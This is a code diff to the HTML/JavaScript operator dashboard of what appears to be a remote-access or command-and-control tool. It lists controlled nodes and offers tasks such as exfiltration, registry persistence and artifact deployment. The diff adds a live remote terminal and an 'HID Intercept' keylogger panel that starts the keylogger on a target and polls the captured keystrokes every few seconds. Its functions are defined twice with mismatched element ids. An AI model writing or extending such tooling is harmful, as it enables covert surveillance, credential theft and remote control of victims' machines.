@@ -132,9 +132,9 @@
               <div id="node-tags" style="display: flex; gap: 10px"></div>
             </div>
             <div style="display: flex; gap: 10px">
-              <button class="btn-danger" onclick="deleteCurrentNode()">
-                Terminate Node
-              </button>
+                <button class="btn-accent" style="background: rgba(34, 197, 94, 0.1); color: var(--success);" onclick="openTerminal()">Live Terminal</button>
+                <button class="btn-accent" onclick="openKeylogger()">HID Intercept</button>
+                <button class="btn-danger" onclick="deleteCurrentNode()">Terminate Node</button>
             </div>
           </div>
 
@@ -146,41 +146,12 @@
               <option value="upload">Deploy Artifact (Upload)</option>
               <option value="download">Exfiltrate Telemetry (Download)</option>
               <option value="persist">Persistence Vector (Registry)</option>
-              <option value="keylogger">Keylogger Pulse (HID)</option>
             </select>
-            <input
-              type="text"
-              id="task-command"
-              placeholder="Enter configuration payload..."
-              style="flex-grow: 1"
-            />
-            <button
-              id="browse-btn"
-              style="
-                background: rgba(255, 255, 255, 0.05);
-                color: white;
-                display: none;
-              "
-              onclick="document.getElementById('file-input').click()"
-            >
-              Browse...
-            </button>
-            <input
-              type="file"
-              id="file-input"
-              style="display: none"
-              onchange="onFileSelected()"
-            />
+            <input type="text" id="task-command" placeholder="Enter configuration payload..." style="flex-grow: 1" />
+            <button id="browse-btn" style="background: rgba(255,255,255,0.05); color: white; display: none;" onclick="document.getElementById('file-input').click()">Browse...</button>
+            <input type="file" id="file-input" style="display: none" onchange="onFileSelected()">
             <button onclick="sendTask()">Execute Job</button>
           </div>
-        </div>
-
-        <!-- Mode Selection Tabs -->
-        <div id="orchestra-tabs" class="tab-container" style="display: none">
-          <div class="tab active" onclick="switchTab('history')">
-            Job History
-          </div>
-          <div class="tab" onclick="switchTab('terminal')">Live Console</div>
         </div>
 
         <!-- Job History -->
@@ -223,30 +194,44 @@
           </div>
         </div>
 
-        <!-- Live Console -->
-        <div id="console-container" style="display: none">
-          <div class="glass-card" style="padding: 0">
-            <div class="console-wrapper">
-              <div id="console-output" class="console-output">
-                <div style="color: grey">
-                  [*] Terminal initialized. Awaiting commands...
-                </div>
-              </div>
-              <div class="console-input-area">
-                <span class="console-prompt">node@dali:~#</span>
-                <input
-                  type="text"
-                  id="console-input"
-                  class="console-input"
-                  autofocus
-                  placeholder="Type a command and press Enter..."
-                  onkeydown="handleConsoleInput(event)"
-                />
-              </div>
+    <!-- Keylogger Modal -->
+    <div id="keylogger-modal-backdrop" class="modal-backdrop">
+        <div class="modal glass-card">
+            <div class="modal-header">
+                <h2 style="display: flex; align-items: center; gap: 10px;">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 9v11a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V9"/><path d="M9 22V12h6v10"/><path d="M2 10.6L12 2l10 8.6"/></svg>
+                    HID Intercept
+                </h2>
+                <button class="btn-secondary" style="padding: 5px 10px;" onclick="closeKeylogger()">Close</button>
             </div>
-          </div>
+            <div id="kl-log" class="kl-log-area">[*] Listener inactive...</div>
+            <div class="kl-controls">
+                <button id="kl-start" class="btn-accent" onclick="startKL()">Deploy Listener</button>
+                <button id="kl-stop" class="btn-danger" style="display: none;" onclick="stopKL()">Terminate Listener</button>
+            </div>
         </div>
-      </div>
+    </div>
+
+    <!-- Terminal Modal -->
+    <div id="term-modal-backdrop" class="modal-backdrop">
+        <div class="modal glass-card" style="max-width: 800px; padding: 0;">
+            <div class="modal-header" style="padding: 1.5rem 1.5rem 0 1.5rem;">
+                <h2 style="display: flex; align-items: center; gap: 10px;">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
+                    Live Terminal Console
+                </h2>
+                <button class="btn-secondary" style="padding: 5px 10px;" onclick="closeTerminal()">Close</button>
+            </div>
+            <div class="console-wrapper" style="border: none; border-radius: 0; height: 550px;">
+                <div id="console-output" class="console-output">
+                    <div style="color: grey;">[*] Terminal initialized. Ready for commands.</div>
+                </div>
+                <div class="console-input-area">
+                    <span class="console-prompt">></span>
+                    <input type="text" id="console-input" class="console-input" autofocus placeholder="Type a command..." onkeydown="handleConsoleInput(event)">
+                </div>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -323,50 +308,46 @@
       let commandHistory = [];
       let historyIndex = -1;
 
-      function switchTab(tab) {
-        const history = document.getElementById("terminal-container");
-        const consoleEle = document.getElementById("console-container");
-        const tabs = document.querySelectorAll(".tab");
+      function openTerminal() {
+          if (!activeAgentId) return;
+          document.getElementById('term-modal-backdrop').style.display = 'flex';
+          document.getElementById('console-input').focus();
+      }
 
-        tabs.forEach((t) => t.classList.remove("active"));
-        if (tab === "history") {
-          history.style.display = "block";
-          consoleEle.style.display = "none";
-          tabs[0].classList.add("active");
-        } else {
-          history.style.display = "none";
-          consoleEle.style.display = "block";
-          tabs[1].classList.add("active");
-          document.getElementById("console-input").focus();
-        }
+      function closeTerminal() {
+          document.getElementById('term-modal-backdrop').style.display = 'none';
       }
 
       function selectAgent(agent) {
         activeAgentId = agent.id;
         document.getElementById("welcome-screen").style.display = "none";
         document.getElementById("agent-controls").style.display = "block";
-        document.getElementById("orchestra-tabs").style.display = "flex";
-        switchTab("history");
-
+        document.getElementById("terminal-container").style.display = "block";
+        
         const displayName = agent.info?.user || agent.id.substring(0, 8);
-        const displayIp = agent.info?.ip || "0.0.0.0";
-        document.getElementById(
-          "active-agent-title"
-        ).innerText = `Managed Node [${displayName} @ ${displayIp}]`;
-
+        const displayIp = agent.info?.ip || '0.0.0.0';
+        document.getElementById("active-agent-title").innerText = `Managed Node [${displayName} @ ${displayIp}]`;
+        
         const tags = document.getElementById("node-tags");
         tags.innerHTML = `
-            <span class="badge" style="background: rgba(255,255,255,0.05)">${
-              agent.info?.user || "Unknown"
-            }</span>
+            <span class="badge" style="background: rgba(255,255,255,0.05)">${agent.info?.user || 'Unknown'}</span>
             <span class="badge" style="background: rgba(56,189,248,0.1); color: var(--accent)">${displayIp}</span>
-            <span class="badge" style="background: rgba(34, 197, 94, 0.1); color: var(--success)">${
-              agent.info?.os || "OS"
-            }</span>
+            <span class="badge" style="background: rgba(34, 197, 94, 0.1); color: var(--success)">${agent.info?.os || 'OS'}</span>
         `;
 
         fetchAgents();
         fetchHistory();
+      }
+
+      function openKeylogger() {
+          if (!activeAgentId) return;
+          document.getElementById('keylogger-modal-backdrop').style.display = 'flex';
+          startKLPolling();
+      }
+
+      function closeKeylogger() {
+          document.getElementById('keylogger-modal-backdrop').style.display = 'none';
+          if (klInterval) clearInterval(klInterval);
       }
 
       function handleConsoleInput(event) {
@@ -665,6 +646,62 @@
           appendToConsole(out.replace(/\n/g, "<br>"));
           lastShell._shown_in_console = true; // Temporary flag
         }
+      }
+
+      let klInterval = null;
+
+      function openKeylogger() {
+          if (!activeAgentId) return;
+          document.getElementById('kl-modal-backdrop').style.display = 'flex';
+          startKLPolling();
+      }
+
+      function closeKeylogger() {
+          document.getElementById('kl-modal-backdrop').style.display = 'none';
+          if (klInterval) clearInterval(klInterval);
+      }
+
+      async function startKL() {
+          await apiFetch(`/operator/tasks`, { 
+              method: "POST", 
+              body: JSON.stringify({ agent_id: activeAgentId, task_type: 'keylogger', payload: { action: 'start', duration: 0 } }) 
+          });
+          document.getElementById('kl-start').style.display = 'none';
+          document.getElementById('kl-stop').style.display = 'inline-block';
+          document.getElementById('kl-log').innerHTML += `<div style="color: grey;">[*] Listener deployed. Streaming HID data...</div>`;
+      }
+
+      async function stopKL() {
+          await apiFetch(`/operator/tasks`, { 
+              method: "POST", 
+              body: JSON.stringify({ agent_id: activeAgentId, task_type: 'keylogger', payload: { action: 'stop' } }) 
+          });
+          document.getElementById('kl-start').style.display = 'inline-block';
+          document.getElementById('kl-stop').style.display = 'none';
+          document.getElementById('kl-log').innerHTML += `<div style="color: grey;">[*] Listener terminated.</div>`;
+      }
+
+      function startKLPolling() {
+          if (klInterval) clearInterval(klInterval);
+          klInterval = setInterval(async () => {
+              if (!activeAgentId) return;
+              // Send a dump request
+              await apiFetch(`/operator/tasks`, { 
+                  method: "POST", 
+                  body: JSON.stringify({ agent_id: activeAgentId, task_type: 'keylogger', payload: { action: 'dump' } }) 
+              });
+              
+              // Find the latest dump result in history
+              const res = await apiFetch(`/api/tasks/${activeAgentId}`);
+              const tasks = await res.json();
+              const latestDump = tasks.find(t => t.type === 'keylogger' && t.status === 'completed' && t.result?.log);
+              if (latestDump && latestDump.result.log && !latestDump._shown_in_kl) {
+                  const area = document.getElementById('kl-log');
+                  area.innerText += latestDump.result.log;
+                  area.scrollTop = area.scrollHeight;
+                  latestDump._shown_in_kl = true;
+              }
+          }, 3000);
       }
 
       connectWebSocket();
